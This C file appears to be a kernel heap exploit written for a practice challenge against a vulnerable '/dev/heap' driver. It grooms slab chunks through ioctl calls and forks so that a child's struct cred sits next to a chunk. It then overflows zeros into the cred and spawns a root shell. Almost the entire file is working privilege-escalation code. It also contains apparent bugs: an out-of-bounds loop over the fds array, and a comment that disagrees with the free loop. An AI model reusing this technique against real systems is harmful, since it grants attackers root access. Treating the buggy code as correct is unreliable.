#include "/root/kernel/template/template.h"

struct param{

	size_t len;
	char *buf;
	size_t idx;
};

void refactor(){

	;
}

int main(){

	printf("heap exploit kernel!\n");
	int fds[20];
	int ptmx_fds[0x100];
	char buf[8];
	int fd;

	//open 10 fds for next ioctl usage.
	for (int i = 0; i < 10 ; i++){
		
		fd  = open("/dev/heap", O_RDWR);
		if(fd == -1){
			perror("open device wrong" );
			return -1;
		}
		fds[i] = fd;
	}

	struct param p;
	p.len = 0x98; //struct cred allocated with kmalloc.
	p.buf = malloc(p.len);

	//ioctl to kmalloc 10 0x98 chunk in slub.
	//before that ,we clean the remaining chunks.
	for(int i = 0; i < 0x400; i++){

		p.idx = i;
		ioctl(fds[i], 5, &p);
	}

	//reallocate
	printf("clean! now reallocate: \n");
	for(int i = 0; i < 10; i++){
		p.idx = i;
		ioctl(fds[i], 5, &p);
	}

	//free middle ones
	for(int i=5; i<6; i++){
		p.idx = i;
		ioctl(fds[i], 7, &p); //free idx 5-8.
	}

	//spray /dev/ptmx! there'll be tty_struct on some slub chunks.
	//for (int i=0; i<0x100; i++){
	//	ptmx_fds[i] = open("/dev/ptmx", O_RDWR|O_NOCTTY);
	//	if(ptmx_fds[i]==-1){
	//		perror("open ptmx error: ");
	//	}
	//}	

	//now , fork!
	int pid = fork();

	//
	if(pid < 0){
		perror("fork failed: ");
		exit(-1);
	}

	//now ptr[4] is adjacent to new process's struct cred!
	//let's overflow it(ptr[4]) to privilege
	p.idx = 4; //points to the fourth chunk
	p.len = 0xc0 + 0x1c; //overflow into point right before fsuid. 
	memset(p.buf, 0, p.len); //all set.
	ioctl(fds[4], 8, &p); //copy from user.

	if(!pid){
		printf("launch root shell now!\n");
		system("/bin/sh");
	}else{
		wait(0);
	}

	//block here.
	getchar();	

	return 0;
}
